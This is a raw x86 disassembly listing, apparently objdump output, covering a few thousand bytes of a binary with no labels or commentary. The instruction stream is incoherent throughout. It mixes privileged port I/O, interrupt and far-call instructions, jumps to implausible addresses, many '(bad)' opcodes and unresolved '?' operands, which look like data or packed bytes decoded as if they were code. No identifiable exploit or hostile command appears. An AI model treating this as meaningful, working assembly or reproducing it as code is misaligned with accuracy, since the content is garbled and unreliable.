  415956:	xor    BYTE PTR [edi-0x66f57039],dl
  41595c:	xor    ebx,ecx
  41595e:	ss sub al,0x97
  415961:	mov    esp,0x3d4865a8
  415966:	ret    0xe232
  415969:	inc    esp
  41596a:	pop    ebx
  41596b:	cli    
  41596c:	test   eax,0x63d92cd1
  415971:	mov    edi,0x9c40c8ba
  415976:	call   0x2dee296e
  41597b:	loop   0x415974
  41597d:	into   
  41597e:	lock fadd st,st(5)
  415981:	xchg   ebx,eax
  415982:	aam    0xc
  415984:	ins    DWORD PTR es:[edi],dx
  415985:	(bad)  
  415986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415987:	cmp    cl,bh
  415989:	xor    BYTE PTR [ecx-0x75],bl
  41598c:	xor    BYTE PTR [ebx-0x15f086f5],dh
  415992:	mov    ds:0xd461fbfb,eax
  415997:	jmp    0x41592d
  415999:	repnz test BYTE PTR [esi],bl
  41599c:	pop    ds
  41599d:	cdq    
  41599e:	xchg   ebx,eax
  41599f:	cmp    eax,0xaaf381cd
  4159a4:	das    
  4159a5:	pcmpeqd mm1,QWORD PTR [edi-0x626cfa87]
  4159ac:	xchg   edi,eax
  4159ad:	rol    cl,cl
  4159af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159b0:	mov    edx,0xec4e6d41
  4159b5:	pop    ecx
  4159b6:	test   eax,0xa0617a05
  4159bb:	jno    0x4159d0
  4159bd:	inc    ebp
  4159be:	aas    
  4159bf:	cmp    BYTE PTR [ebx+0x26fb401a],ch
  4159c5:	xlat   BYTE PTR ds:[ebx]
  4159c6:	or     al,0xca
  4159c9:	sub    ch,BYTE PTR [ebx-0x432dbb0f]
  4159cf:	xor    eax,0xfab1ae4
  4159d4:	jns    0x4159a7
  4159d6:	(bad)  
  4159d8:	adc    dh,bl
  4159da:	rcr    DWORD PTR [edi],1
  4159dc:	dec    eax
  4159dd:	popf   
  4159de:	jno    0x41597a
  4159e0:	ss or  al,0xe5
  4159e3:	dec    ebp
  4159e4:	sbb    eax,0x81846667
  4159e9:	outs   dx,DWORD PTR ds:[esi]
  4159ea:	popa   
  4159eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159ec:	adc    dl,0x7
  4159ef:	mov    al,0xbe
  4159f1:	mov    eax,ds:0xa8109834
  4159f6:	push   es
  4159f7:	adc    BYTE PTR [ecx+eax*8+0x7ba7768a],0x95
  4159ff:	sub    bl,cl
  415a01:	cs daa 
  415a03:	mov    bh,0x2a
  415a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a06:	fst    DWORD PTR [esi+0x6]
  415a09:	icebp  
  415a0a:	pushf  
  415a0b:	jae    0x415a52
  415a0d:	xchg   esi,eax
  415a0e:	imul   edx,DWORD PTR [esi],0x1b
  415a11:	rcr    DWORD PTR ds:0x48efb43f,cl
  415a17:	cdq    
  415a18:	in     eax,dx
  415a19:	inc    edx
  415a1a:	cmp    edi,DWORD PTR ss:[edi+0x28]
  415a1e:	loop   0x415a62
  415a20:	cs push ecx
  415a22:	fidivr DWORD PTR [esi]
  415a24:	loopne 0x4159ed
  415a26:	js     0x415a65
  415a28:	xchg   BYTE PTR [ebp-0x5276b42b],ch
  415a2e:	mov    bh,0x2c
  415a30:	add    al,0x34
  415a32:	shl    BYTE PTR [ecx-0x250b69d7],0x57
  415a39:	scas   eax,DWORD PTR es:[edi]
  415a3a:	push   edx
  415a3b:	jg     0x415a57
  415a3d:	cs xor esi,esp
  415a40:	cdq    
  415a41:	mov    cl,BYTE PTR [edi]
  415a43:	jne    0x415a4c
  415a45:	and    al,0xcd
  415a47:	and    eax,0xd01f8bbc
  415a4c:	push   0x76
  415a4e:	inc    edi
  415a4f:	out    dx,al
  415a50:	jmp    0xe346b2ac
  415a55:	dec    esp
  415a56:	pop    ecx
  415a57:	imul   edi,DWORD PTR [eax+0x21],0xffffffee
  415a5b:	fs addr16 jns 0x415ab3
  415a5f:	pop    ebp
  415a60:	mov    eax,ds:0x54da2966
  415a65:	push   cs
  415a66:	jbe    0x415a26
  415a68:	xor    bh,cl
  415a6a:	popa   
  415a6b:	sbb    eax,DWORD PTR [eax-0x7937fc05]
  415a71:	fiadd  DWORD PTR [eax-0x52]
  415a74:	sub    eax,0xcc4e808e
  415a79:	add    ebx,esp
  415a7b:	sub    ecx,ebx
  415a7d:	xchg   esp,eax
  415a7e:	sub    DWORD PTR [esi+0x1d144e43],ebx
  415a84:	ss sub eax,0xb0ef394b
  415a8a:	aad    0x8a
  415a8c:	jbe    0x415ad8
  415a8e:	in     al,0x61
  415a90:	xchg   ebx,eax
  415a91:	sub    DWORD PTR [ebp-0x15],esi
  415a94:	aam    0x81
  415a96:	out    dx,eax
  415a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a98:	ficom  WORD PTR ds:0xe62533e4
  415a9e:	cmp    BYTE PTR [edx-0x1c747d1],al
  415aa4:	in     eax,0xad
  415aa6:	loop   0x415aaa
  415aa8:	repz ret 0xae8f
  415aac:	mov    edx,0x4df22e24
  415ab1:	popa   
  415ab2:	inc    esi
  415ab3:	jecxz  0x415a65
  415ab5:	test   eax,0x96ddc4ea
  415aba:	push   0xffffffcf
  415abc:	cmp    DWORD PTR [esi],eax
  415abe:	inc    esi
  415abf:	fs inc eax
  415ac1:	lock lahf 
  415ac3:	fimul  WORD PTR [edx-0x4b9c2c5f]
  415ac9:	aam    0x64
  415acb:	push   eax
  415acc:	enter  0xf6bf,0x53
  415ad0:	adc    DWORD PTR [edx-0x29],ebx
  415ad3:	cdq    
  415ad4:	test   ebx,ebp
  415ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ad7:	sbb    eax,0x7794fb63
  415adc:	data16 std 
  415ade:	and    eax,0x34156e7
  415ae3:	pusha  
  415ae4:	addr16 out 0x7,al
  415ae7:	push   es
  415ae8:	xor    ch,ah
  415aea:	and    cl,ah
  415aec:	push   eax
  415aed:	popa   
  415aee:	dec    edx
  415aef:	shl    BYTE PTR [edi+esi*2-0x5fad40bd],1
  415af6:	outs   dx,BYTE PTR ds:[esi]
  415af7:	jge    0x415af4
  415af9:	mov    dl,0xda
  415afb:	(bad)  
  415afc:	xchg   esp,eax
  415afd:	sahf   
  415afe:	je     0x415b52
  415b00:	loope  0x415b47
  415b02:	push   edi
  415b03:	addr16 popf 
  415b05:	(bad)  
  415b06:	push   ebx
  415b07:	bound  esi,QWORD PTR [edx-0x2a85408b]
  415b0d:	mov    al,ds:0xc38af80d
  415b12:	cmp    ebx,0x67b7ba1c
  415b18:	mov    dl,0x1
  415b1a:	mov    DWORD PTR [eax-0x10],edx
  415b1d:	adc    al,0xdc
  415b1f:	not    BYTE PTR [edx+0x4f]
  415b22:	das    
  415b23:	(bad)  
  415b24:	adc    bh,dl
  415b26:	mov    ebp,DWORD PTR [ebx+0x65]
  415b29:	dec    esi
  415b2a:	mov    ebx,0x20200f55
  415b2f:	ret    0x85de
  415b32:	loopne 0x415b4a
  415b34:	or     bl,BYTE PTR [edi-0x4a37334a]
  415b3a:	les    esp,FWORD PTR [edx+0x17eaec5c]
  415b40:	nop
  415b41:	adc    DWORD PTR [esi+0x5aa41498],0xfffffffc
  415b48:	leave  
  415b49:	ja     0x415b5c
  415b4b:	inc    edi
  415b4c:	jo     0x415b73
  415b4e:	jle    0x415b4d
  415b50:	mov    DWORD PTR [ebx+0x4748937f],edi
  415b56:	mov    al,ds:0x91c0822f
  415b5b:	(bad)  
  415b5c:	sub    eax,0x10df3086
  415b61:	pop    ds
  415b62:	(bad)  
  415b63:	sbb    al,0x24
  415b65:	int    0xef
  415b67:	push   es
  415b68:	push   esp
  415b69:	out    dx,eax
  415b6a:	pop    ecx
  415b6c:	(bad)  
  415b6d:	jmp    0x415b81
  415b6f:	fwait
  415b70:	mov    cl,0xf6
  415b72:	mov    edx,0x74c3ccb8
  415b77:	ret    
  415b78:	ret    0x2a22
  415b7b:	mov    bh,0xaf
  415b7d:	add    al,BYTE PTR [eax]
  415b7f:	mov    esp,0x5d31bd7c
  415b84:	cmp    eax,0x6853c10
  415b89:	jle    0x415b5d
  415b8b:	retf   0xa6a4
  415b8e:	jl     0x415b76
  415b90:	xchg   BYTE PTR [eax-0xc],ch
  415b93:	lea    eax,[ebx]
  415b95:	into   
  415b96:	sbb    ch,BYTE PTR [esi]
  415b98:	xor    ah,BYTE PTR [eax-0x54260505]
  415b9e:	out    dx,al
  415b9f:	sub    al,0xea
  415ba1:	jmp    0x415c1e
  415ba3:	add    al,0x7e
  415ba5:	and    al,0xa
  415ba7:	in     al,dx
  415ba8:	(bad)  
  415ba9:	repnz std 
  415bab:	(bad)  
  415bac:	jmp    0x25e8503a
  415bb1:	in     eax,dx
  415bb2:	outs   dx,DWORD PTR ds:[esi]
  415bb3:	sar    BYTE PTR [ebp-0x11],cl
  415bb6:	sbb    BYTE PTR [ecx+0x6e],cl
  415bb9:	add    DWORD PTR [eax-0x7ffb7e10],edx
  415bbf:	adc    eax,0xa4986c9b
  415bc4:	into   
  415bc5:	in     eax,dx
  415bc6:	jecxz  0x415b86
  415bc8:	mov    edi,0xd1e4c672
  415bcd:	mov    al,ds:0xa82f5c80
  415bd2:	xchg   edi,eax
  415bd3:	pop    ds
  415bd4:	leave  
  415bd5:	mov    ebx,0xb5157b73
  415bda:	fbstp  TBYTE PTR [esi]
  415bdc:	in     al,dx
  415bdd:	fld    QWORD PTR [ecx]
  415bdf:	add    DWORD PTR [edx-0x7e],esp
  415be2:	inc    edx
  415be3:	sahf   
  415be4:	sbb    al,0x14
  415be6:	loop   0x415ba7
  415be8:	push   cs
  415be9:	pop    esi
  415bea:	xchg   ecx,eax
  415beb:	push   edx
  415bec:	pop    ecx
  415bed:	mov    al,ds:0x86cd8fbb
  415bf2:	and    al,0xd5
  415bf4:	xlat   BYTE PTR ds:[ebx]
  415bf5:	fcmovne st,st(5)
  415bf7:	jbe    0x415be7
  415bf9:	jl     0x415c67
  415bfb:	mov    DWORD PTR [ebx],ecx
  415bfd:	lock adc eax,0xa01ab4da
  415c03:	xor    dl,dh
  415c05:	adc    BYTE PTR [ebx],dl
  415c07:	push   esp
  415c08:	push   esp
  415c09:	inc    esi
  415c0a:	aam    0x73
  415c0c:	cmovp  ebx,ecx
  415c0f:	(bad)  
  415c10:	stos   DWORD PTR es:[edi],eax
  415c11:	sub    al,BYTE PTR [edi]
  415c13:	stos   BYTE PTR es:[edi],al
  415c14:	in     al,dx
  415c15:	cmp    BYTE PTR [ecx-0x56],cl
  415c18:	setb   BYTE PTR [esi+0x52eb316c]
  415c1f:	int    0x70
  415c21:	xchg   ebx,eax
  415c22:	fmul   QWORD PTR [ebx-0x6a]
  415c25:	imul   esi,DWORD PTR [ebx+0x4b],0x7c44852b
  415c2c:	xor    cl,BYTE PTR [edx+0x69f8eaf2]
  415c32:	dec    ebx
  415c33:	sub    DWORD PTR [ecx+0x48],ebx
  415c36:	retf   0x1124
  415c39:	sub    ch,BYTE PTR [edi+0xd49dc35]
  415c3f:	sti    
  415c40:	inc    eax
  415c41:	push   ecx
  415c42:	in     eax,dx
  415c43:	ud1    edx,DWORD PTR [ecx+0xc9ba410]
  415c4a:	test   al,0xae
  415c4c:	retf   
  415c4d:	popf   
  415c4e:	iret   
  415c4f:	rol    ebp,0x89
  415c52:	inc    esp
  415c53:	aaa    
  415c54:	(bad)  
  415c55:	adc    BYTE PTR [edx],cl
  415c57:	pop    es
  415c58:	(bad)  
  415c59:	pop    ss
  415c5a:	pop    esi
  415c5b:	inc    edx
  415c5c:	inc    edx
  415c5d:	imul   ecx,DWORD PTR [ecx+esi*2+0x6c620627],0xdcd160b5
  415c68:	xor    dl,0xa3
  415c6b:	push   esi
  415c6c:	xchg   esp,eax
  415c6d:	jg     0x415c49
  415c6f:	mov    ds:0x5c21c99,al
  415c74:	ja     0x415c66
  415c76:	jo     0x415bfc
  415c78:	and    eax,0x2fd07a9f
  415c7d:	stc    
  415c7e:	mov    edi,0x91828243
  415c83:	call   FWORD PTR [edx]
  415c85:	mov    ebx,0x77a333c6
  415c8a:	(bad)  
  415c8b:	ins    DWORD PTR es:[edi],dx
  415c8c:	mov    bl,0x6d
  415c8e:	(bad)  
  415c8f:	outs   dx,DWORD PTR ds:[esi]
  415c90:	popf   
  415c91:	xchg   esp,eax
  415c92:	neg    esp
  415c94:	in     eax,dx
  415c95:	mov    ebx,DWORD PTR [ebp+0x78800762]
  415c9b:	div    edx
  415c9d:	push   eax
  415c9e:	sub    al,0xf6
  415ca0:	sbb    ebx,esp
  415ca2:	cmp    DWORD PTR [ecx+0x72],0xdaddefa7
  415ca9:	sub    al,0x2e
  415cab:	aam    0x3a
  415cad:	adc    BYTE PTR [edi+0xf],al
  415cb0:	inc    ebp
  415cb1:	cs add al,0x77
  415cb4:	mov    al,ds:0x5098ecb
  415cb9:	fwait
  415cba:	pop    ebp
  415cbb:	xor    eax,0xfef89ed9
  415cc0:	push   ebp
  415cc1:	leave  
  415cc2:	sub    al,0x70
  415cc4:	xor    esi,eax
  415cc6:	mul    BYTE PTR [eax]
  415cc8:	mov    ?,WORD PTR [edx+0x7c]
  415ccb:	pop    esp
  415ccc:	jo     0x415cc2
  415cce:	push   0xa8a7a517
  415cd3:	sbb    ebp,DWORD PTR [edi-0x3e]
  415cd6:	jo     0x415cb3
  415cd8:	pop    esi
  415cd9:	adc    eax,0x58ee433d
  415cde:	cmp    DWORD PTR [ecx+0x5a2b5dac],esp
  415ce4:	(bad)  
  415ce5:	push   ds
  415ce6:	lock adc BYTE PTR [edx-0x3c],al
  415cea:	cmp    al,0x5a
  415cec:	pop    edi
  415ced:	rcr    DWORD PTR ds:0x6c39146a,0xcb
  415cf4:	out    0x5f,al
  415cf6:	in     al,0x70
  415cf8:	or     dl,BYTE PTR [esi]
  415cfa:	and    al,0x3d
  415cfc:	mov    ebx,0x39155546
  415d01:	imul   ecx,DWORD PTR [eax-0x3e],0x33
  415d05:	jmp    0x667adb49
  415d0a:	shl    bl,cl
  415d0c:	adc    al,0xab
  415d0e:	es loopne 0x415d60
  415d11:	jle    0x415cee
  415d13:	adc    DWORD PTR [ebp+0x6f],eax
  415d16:	rcl    DWORD PTR [ecx-0x51],cl
  415d19:	dec    eax
  415d1a:	cmp    BYTE PTR [eax+0x69],al
  415d1d:	vshufps ymm5,ymm5,YMMWORD PTR [ecx],0xe
  415d22:	cmp    eax,0x48cf8419
  415d27:	inc    ebp
  415d28:	dec    edx
  415d29:	inc    esi
  415d2a:	jo     0x415cbf
  415d2c:	mov    BYTE PTR [ecx],cl
  415d2e:	sub    edx,DWORD PTR [ebp+0x64]
  415d31:	sbb    al,0x42
  415d33:	daa    
  415d34:	adc    eax,0x8d5ee259
  415d39:	cld    
  415d3a:	pop    eax
  415d3b:	pushf  
  415d3c:	int    0xb6
  415d3e:	push   esp
  415d3f:	retf   
  415d40:	xchg   ebx,eax
  415d41:	jns    0x415cd2
  415d43:	xor    BYTE PTR [edx-0x7f597077],dh
  415d49:	xor    bh,BYTE PTR [ebp+0x6f]
  415d4c:	cmp    al,0xaf
  415d4f:	and    bh,BYTE PTR [esi+ebx*2]
  415d52:	jnp    0x415db1
  415d54:	test   ecx,ebx
  415d56:	rcl    BYTE PTR [eax],0xa
  415d59:	pop    edx
  415d5a:	push   ebx
  415d5b:	sbb    BYTE PTR [ecx],0x9
  415d5e:	inc    esp
  415d5f:	xlat   BYTE PTR ds:[ebx]
  415d60:	aam    0x1c
  415d62:	jbe    0x415d40
  415d64:	aas    
  415d65:	arpl   WORD PTR [ebx],sp
  415d67:	inc    edx
  415d68:	shl    dl,cl
  415d6a:	lods   eax,DWORD PTR ds:[esi]
  415d6b:	xor    ebp,DWORD PTR [ebp-0x52]
  415d6e:	adc    al,0x37
  415d70:	pop    edi
  415d71:	lahf   
  415d72:	add    eax,0xe7308e51
  415d77:	pop    esi
  415d78:	and    esi,DWORD PTR [edx]
  415d7a:	pushf  
  415d7b:	mov    ebx,DWORD PTR [ebp+0x26da181e]
  415d81:	popa   
  415d82:	int3   
  415d83:	popa   
  415d84:	(bad)  
  415d85:	(bad)
  415d8a:	pop    esi
  415d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d8c:	aad    0xcd
  415d8e:	sbb    bl,BYTE PTR [ebp+0x73]
  415d91:	fs popf 
  415d93:	dec    esp
  415d94:	pop    esi
  415d95:	dec    edx
  415d96:	pop    ebx
  415d97:	cmp    dl,BYTE PTR [edi-0x4b475617]
  415d9d:	or     DWORD PTR [ecx],esi
  415d9f:	mov    ds:0xd83bcea9,eax
  415da4:	loope  0x415d33
  415da6:	aaa    
  415da7:	fst    DWORD PTR [ebx+edx*2-0x50]
  415dab:	sbb    dh,BYTE PTR [ebx]
  415dad:	lds    edi,FWORD PTR [ecx]
  415daf:	stc    
  415db0:	cld    
  415db1:	xchg   BYTE PTR [ebp-0x17],ch
  415db4:	retf   0x80ae
  415db7:	sbb    BYTE PTR [ebx+0x54],0x7b
  415dbb:	int    0xc3
  415dbd:	sbb    al,0x59
  415dbf:	aaa    
  415dc0:	loopne 0x415e1b
  415dc2:	ret    
  415dc3:	in     eax,dx
  415dc4:	mov    ebp,0xc9334e93
  415dc9:	repz iret 
  415dcb:	and    DWORD PTR [eax],ebx
  415dcd:	mov    esp,DWORD PTR [eax-0x3c]
  415dd0:	daa    
  415dd1:	call   0x97063006
  415dd6:	cdq    
  415dd7:	lods   al,BYTE PTR ds:[esi]
  415dd8:	sbb    BYTE PTR [ecx],dl
  415dda:	xchg   ecx,eax
  415ddb:	push   edx
  415ddc:	ins    DWORD PTR es:[edi],dx
  415ddd:	out    dx,al
  415dde:	push   edx
  415ddf:	mov    eax,ds:0xd245f643
  415de4:	sub    BYTE PTR [eax-0x2],0x46
  415de8:	jg     0x415e36
  415dea:	jmp    0x4b699d17
  415def:	cmp    eax,0x7c28f244
  415df4:	xlat   BYTE PTR ds:[ebx]
  415df5:	inc    ebx
  415df6:	push   es
  415df7:	adc    bh,BYTE PTR [ebx+edx*2]
  415dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dfb:	shr    DWORD PTR [edi-0x67],0xaf
  415dff:	les    ebp,FWORD PTR [edx-0x639bb3ee]
  415e05:	sti    
  415e06:	mov    dh,0xc6
  415e08:	inc    ebx
  415e09:	idiv   DWORD PTR [ecx]
  415e0b:	lahf   
  415e0c:	aad    0xd1
  415e0e:	sub    al,0xe3
  415e10:	cmp    al,0x67
  415e12:	sub    cl,ch
  415e14:	je     0x415e39
  415e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e17:	sub    eax,0x7ec5d8f
  415e1c:	sub    eax,esi
  415e1e:	call   0x6105a195
  415e23:	jmp    0x415e23
  415e25:	xchg   ecx,eax
  415e26:	or     ch,BYTE PTR [ebp+0x2b]
  415e29:	pop    edx
  415e2a:	mov    bl,0x18
  415e2c:	mov    ds:0xd2b43f9e,al
  415e31:	add    edx,DWORD PTR [edx+edx*1+0x65d5a262]
  415e38:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e3a:	fsubr  DWORD PTR [edx]
  415e3c:	repnz cmp ebx,DWORD PTR [ebx-0x303d2a03]
  415e43:	mov    eax,ds:0x65fe0335
  415e48:	into   
  415e49:	ins    DWORD PTR es:[edi],dx
  415e4a:	cmp    ch,ah
  415e4c:	or     eax,0xfd8cd1dd
  415e51:	xchg   edi,eax
  415e52:	cwde   
  415e53:	push   0xd480e52e
  415e58:	cmp    DWORD PTR [edx],0x945d4190
  415e5e:	(bad)  
  415e5f:	ins    DWORD PTR es:[edi],dx
  415e60:	pop    edx
  415e61:	adc    esi,DWORD PTR ds:0xf1a0e1d9
  415e67:	xor    ecx,DWORD PTR [esi]
  415e69:	aaa    
  415e6a:	push   esi
  415e6b:	xchg   BYTE PTR [ebx-0x10aaa662],ah
  415e71:	push   cs
  415e72:	pop    ebx
  415e73:	sbb    BYTE PTR ds:0x4817f9df,cl
  415e79:	sub    ch,BYTE PTR [edi-0x2c]
  415e7c:	inc    ax
  415e7e:	mov    edx,0xd19ee6ba
  415e83:	dec    eax
  415e84:	pop    ebx
  415e86:	mov    edi,ebp
  415e88:	mov    edi,fs
  415e8a:	stos   BYTE PTR es:[edi],al
  415e8b:	pop    es
  415e8c:	fisubr WORD PTR [ebx+0x3755392]
  415e92:	and    al,0xe6
  415e94:	cld    
  415e95:	cmp    edx,eax
  415e97:	(bad)  
  415e99:	dec    esi
  415e9a:	and    DWORD PTR [ecx],esp
  415e9c:	add    al,0x46
  415e9e:	mov    al,ds:0x79439a88
  415ea3:	les    ebx,FWORD PTR ds:0x3582159d
  415ea9:	push   0xc7ef179b
  415eae:	sbb    ebp,DWORD PTR [eax+0x207cb752]
  415eb4:	(bad)  
  415eb5:	pop    ds
  415eb6:	call   0x61ff:0x11907c5f
  415ebd:	test   bl,bl
  415ebf:	push   0x4800d608
  415ec4:	jnp    0x415e64
  415ec6:	shr    BYTE PTR [ebx],0xcb
  415ec9:	(bad)  
  415eca:	leave  
  415ecb:	pop    gs
  415ecd:	scas   al,BYTE PTR es:[edi]
  415ece:	ins    DWORD PTR es:[edi],dx
  415ecf:	stos   DWORD PTR es:[edi],eax
  415ed0:	in     al,0x52
  415ed2:	ficom  WORD PTR [ebx+0x2e]
  415ed5:	inc    edi
  415ed6:	mov    dh,0x97
  415ed8:	pop    esp
  415ed9:	or     edi,DWORD PTR [ebx-0x1b]
  415edc:	std    
  415edd:	jle    0x415f2a
  415edf:	xchg   esi,esi
  415ee1:	fdiv   DWORD PTR [esi]
  415ee3:	aaa    
  415ee4:	jecxz  0x415eb0
  415ee6:	push   0x41
  415ee8:	inc    edi
  415ee9:	mov    edx,0x320f9b0d
  415eee:	stc    
  415eef:	jno    0x415f11
  415ef1:	add    al,0x7
  415ef3:	int3   
  415ef4:	sub    al,0x12
  415ef6:	jmp    0x24146321
  415efb:	test   eax,0x2a8ff372
  415f00:	jno    0x415e99
  415f02:	mov    WORD PTR [ecx+0x39bd7014],?
  415f08:	pop    edx
  415f09:	call   0x776d:0xbbf5ed8d
  415f10:	popa   
  415f11:	out    0x3f,eax
  415f13:	push   ecx
  415f14:	push   cs
  415f15:	(bad)  
  415f17:	int3   
  415f18:	and    al,BYTE PTR [eax]
  415f1a:	inc    esp
  415f1b:	(bad)  
  415f1c:	mov    bl,0xa3
  415f1e:	xlat   BYTE PTR ds:[ebx]
  415f1f:	sub    ebx,DWORD PTR [eax]
  415f21:	adc    al,0x53
  415f23:	sbb    DWORD PTR [ecx],esp
  415f25:	xor    BYTE PTR [edi+0x69],dl
  415f28:	adc    DWORD PTR ds:0xfe09b52a,ecx
  415f2e:	pop    ds
  415f2f:	xor    al,0xc3
  415f31:	(bad)  
  415f32:	mov    dl,0x97
  415f34:	shr    BYTE PTR [ecx],1
  415f36:	jno    0x415ee7
  415f38:	cwde   
  415f39:	dec    ebx
  415f3a:	(bad)  
  415f3b:	xchg   edx,eax
  415f3c:	scas   al,BYTE PTR es:[edi]
  415f3d:	push   edx
  415f3e:	pop    ebp
  415f3f:	fucomp st(3)
  415f41:	and    BYTE PTR ds:0xf4eedcb9,ch
  415f47:	jno    0x415fb6
  415f49:	pop    eax
  415f4b:	stc    
  415f4c:	scas   al,BYTE PTR es:[edi]
  415f4d:	call   0x3df8e88
  415f52:	fcmovnu st,st(0)
  415f54:	fwait
  415f55:	mov    ds:0x74fc6cc3,eax
  415f5a:	xor    al,0xc6
  415f5c:	cld    
  415f5d:	sub    eax,DWORD PTR [ecx+ebx*2]
  415f60:	test   dl,ah
  415f62:	outs   dx,BYTE PTR ds:[esi]
  415f63:	clc    
  415f64:	jae    0x415f78
  415f66:	shl    ch,cl
  415f68:	lock fidivr DWORD PTR [esi-0x6]
  415f6c:	push   0x95ff0348
  415f71:	(bad)  
  415f73:	and    DWORD PTR [edx-0x59],esp
  415f76:	rcl    BYTE PTR ds:0x89a0e3b6,1
  415f7c:	mov    esp,0x5235e81c
  415f81:	cmp    al,0x69
  415f83:	mov    esp,0xd9beb86b
  415f88:	les    ecx,FWORD PTR [ebp+0x721221e7]
  415f8e:	pop    esp
  415f8f:	gs inc ebp
  415f91:	arpl   WORD PTR ds:0x9c793694,cx
  415f97:	leave  
  415f98:	add    cl,BYTE PTR [ebp-0x3a90df01]
  415f9e:	ficom  DWORD PTR [esi+0x7f]
  415fa1:	mov    al,ds:0x7808fadc
  415fa6:	pop    ebx
  415fa7:	lods   eax,DWORD PTR ds:[esi]
  415fa8:	fcmovnbe st,st(5)
  415faa:	mov    al,ds:0x896e7dec
  415faf:	mov    BYTE PTR [esi+edi*8-0x24113980],ah
  415fb6:	ret    
  415fb7:	pop    ecx
  415fb8:	repnz cdq 
  415fba:	cmp    al,0x77
  415fbc:	push   ecx
  415fbd:	idiv   BYTE PTR [ebx-0x70]
  415fc0:	cmp    DWORD PTR [edi+edx*8],eax
  415fc3:	add    cl,BYTE PTR [ecx+0x52]
  415fc6:	nop
  415fc7:	in     eax,0xd3
  415fc9:	std    
  415fca:	shl    DWORD PTR [ecx-0x2d],cl
  415fcd:	add    al,0xda
  415fcf:	add    DWORD PTR [ebp-0x30430aa6],edi
  415fd5:	fiadd  WORD PTR [ebx-0xb860d6f]
  415fdb:	dec    edx
  415fdc:	add    BYTE PTR [esi+eiz*2+0x2ac4dc0c],0x55
  415fe4:	jle    0x415f70
  415fe6:	xor    esi,DWORD PTR [eax]
  415fe8:	mov    ds:0x68e5c90d,al
  415fed:	pop    edx
  415fee:	retf   
  415fef:	ja     0x41602a
  415ff1:	or     BYTE PTR [edi+0x1a],bl
  415ff4:	lods   al,BYTE PTR ds:[esi]
  415ff5:	stc    
  415ff6:	xor    eax,0x7ed7a30e
  415ffb:	cld    
  415ffc:	lods   al,BYTE PTR ds:[esi]
  415ffd:	adc    esi,DWORD PTR [ecx+0x16c7b392]
  416003:	or     bl,BYTE PTR [eax]
  416005:	inc    esp
  416006:	fidiv  DWORD PTR [eax+0x77]
  416009:	fs push 0xffffffdd
  41600c:	xchg   esp,eax
  41600d:	sbb    al,0x79
  41600f:	xlat   BYTE PTR ds:[ebx]
  416010:	bnd jne 0x416012
  416013:	pop    eax
  416014:	ret    0xb900
  416017:	xor    al,0xa9
  416019:	sbb    esp,DWORD PTR [edx]
  41601b:	out    dx,eax
  41601c:	pop    ebp
  41601d:	loope  0x415fb0
  41601f:	retf   0x9701
  416022:	jmp    0x327e5fba
  416027:	adc    eax,0x99d2be74
  41602c:	xchg   ebp,eax
  41602d:	les    esp,FWORD PTR [edi+0x18]
  416030:	jns    0x416030
  416032:	retf   0x21cf
  416035:	ror    BYTE PTR [ebx],1
  416037:	xlat   BYTE PTR ds:[ebx]
  416038:	mov    bh,0x50
  41603a:	or     al,BYTE PTR [eax]
  41603c:	pop    ss
  41603d:	dec    eax
  41603e:	jle    0x4160ab
  416040:	mov    dl,0x71
  416042:	xchg   edx,eax
  416043:	adc    ch,dh
  416045:	in     eax,dx
  416046:	mov    eax,0x4f75b5ea
  41604b:	mov    dh,0x60
  41604d:	xor    bl,bl
  41604f:	mov    ebx,0xbba5a6b7
  416054:	mov    ch,BYTE PTR [ebp+0x7eeb29d5]
  41605a:	inc    eax
  41605b:	xor    ch,ah
  41605d:	pushf  
  41605e:	shr    DWORD PTR [edx],cl
  416060:	sub    bh,BYTE PTR [ebx+0x1156d0b8]
  416066:	jecxz  0x416039
  416068:	jecxz  0x416084
  41606a:	cmc    
  41606b:	push   esp
  41606c:	ss (bad) 
  41606e:	and    al,0xc7
  416070:	mov    eax,0x7133faa1
  416075:	xor    al,BYTE PTR ds:0xb2c02db
  41607b:	push   ebp
  41607c:	fnsave [esi+0xa]
  41607f:	js     0x416060
  416081:	inc    ebp
  416082:	test   eax,0x919e8026
  416087:	popf   
  416088:	(bad)  
  41608a:	xor    dh,0xd6
  41608d:	das    
  41608e:	daa    
  41608f:	sti    
  416090:	inc    ebp
  416091:	mov    cl,0xef
  416093:	ss (bad) 
  416095:	jge    0x4160eb
  416097:	mov    dh,0x53
  416099:	cmc    
  41609a:	call   DWORD PTR [edi+0x68546cc8]
  4160a0:	mov    ah,0xba
  4160a2:	lods   al,BYTE PTR ds:[esi]
  4160a3:	push   ebp
  4160a4:	sub    al,0x1f
  4160a6:	push   edi
  4160a7:	jg     0x41610c
  4160a9:	xchg   esp,eax
  4160aa:	lods   al,BYTE PTR ds:[esi]
  4160ab:	fyl2x  
  4160ad:	add    al,0xd5
  4160af:	mov    eax,ds:0xcf48cfb8
  4160b4:	test   eax,0xec8a8d9e
  4160b9:	rol    DWORD PTR ds:0x1b4b30ef,cl
  4160bf:	add    eax,0xecf463d1
  4160c4:	jle    0x41607a
  4160c6:	gs cwde 
  4160c8:	pushf  
  4160c9:	mov    ch,0x19
  4160cb:	dec    ebx
  4160cc:	mov    dh,0x34
  4160ce:	cmp    DWORD PTR [edx],esp
  4160d0:	out    dx,eax
  4160d1:	loopne 0x416108
  4160d3:	xor    BYTE PTR [eax+0x76dada49],0xee
  4160da:	jecxz  0x4160c0
  4160dc:	inc    eax
  4160dd:	sub    ax,0x7862
  4160e1:	jns    0x4160fa
  4160e3:	retf   
  4160e4:	and    al,0x65
  4160e6:	mov    eax,0xfd1e0225
  4160eb:	sub    cl,BYTE PTR [eax+0x45085941]
  4160f1:	sbb    eax,0x791d780b
  4160f6:	mov    ebx,0xc996016b
  4160fb:	mov    al,0x3b
  4160fd:	clc    
  4160fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ff:	rol    ebp,cl
  416101:	mov    ebp,0x6a3619ca
  416106:	stos   BYTE PTR es:[edi],al
